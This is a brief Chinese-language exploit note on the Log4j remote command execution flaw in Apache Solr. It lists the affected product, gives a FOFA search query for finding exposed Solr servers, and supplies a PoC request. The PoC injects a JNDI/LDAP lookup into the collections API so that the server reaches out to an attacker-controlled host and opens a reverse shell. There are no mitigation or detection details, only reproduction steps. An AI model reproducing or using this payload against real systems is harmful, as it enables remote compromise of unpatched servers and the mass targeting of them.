# Apache Solr Log4j组件 远程命令执行漏洞

## 漏洞描述

Apache Solr Log4j组件 远程命令执行漏洞，详情略

## 漏洞影响

```
Apache Solr
```

## FOFA

```
app="APACHE-Solr"
```

## 漏洞复现

登录页面

![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251622273.png)

验证POC

```
/solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/87}&wt=json
```

![](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251622876.png)